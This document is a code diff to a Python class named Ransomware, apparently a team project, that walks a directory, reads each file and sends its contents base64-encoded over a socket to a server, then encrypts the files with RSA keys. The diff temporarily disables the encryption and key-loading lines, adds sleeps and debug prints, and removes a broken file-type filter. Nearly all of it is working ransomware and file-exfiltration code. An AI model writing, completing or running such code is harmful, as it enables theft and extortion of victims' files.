@@ -8,7 +8,7 @@ import base64
 import logging
 import socket
 import math
-import rsa
+#import rsa
 import threading
 
 
@@ -60,21 +60,15 @@ class Ransomware:
         return self._socket
 
 
-
-
-
     #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path, filename):
-        print(filename)
-        
-        if ".pdf" or ".jar" in filename:
-            return
-            
+    
         """ Opening and reading the file data. """
         file = open(file_path, "r", encoding = "ISO-8859-1")
 
         """ Sending the filename to the server. """
-        self._socket.send(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        time.sleep(0.01)
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
 
@@ -91,6 +85,7 @@ class Ransomware:
         """ Closing the file. """
         file.close()
         
+        time.sleep(0.01)
         self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
@@ -176,12 +171,14 @@ class Ransomware:
                 file_size = os.path.getsize(file_path)
                 size_of_files += file_size
                 number_of_files += 1
+                
+                print("filename: "+file)
 
                 # Send file to server
                 self.send_file_to_server(file_path, file)
                 
                 # Encrypt file
-                self.encrypt_file(file_path, key)
+                # self.encrypt_file(file_path, key)
         
         self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
@@ -228,8 +225,8 @@ class Ransomware:
         #file.close()
 
         #Read the public key from the server
-        with open("public_key.pem", "rb") as key_content:
-            key = rsa.PublicKey.load_pkcs1(key_content.read())
+        #with open("public_key.pem", "rb") as key_content:
+        #    key = rsa.PublicKey.load_pkcs1(key_content.read())
 
         #Encrypt all files
         t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory))
@@ -290,8 +287,8 @@ class Ransomware:
 
             #Read the private key from the server
             #I am not sure where to put this above, so I will leave it here for now
-            with open("private_key.pem", "rb") as key_content:
-                key = rsa.PrivateKey.load_pkcs1(key_content.read())
+            #with open("private_key.pem", "rb") as key_content:
+            #    key = rsa.PrivateKey.load_pkcs1(key_content.read())
         
             # self.decrypt_all_files(home, key)
         
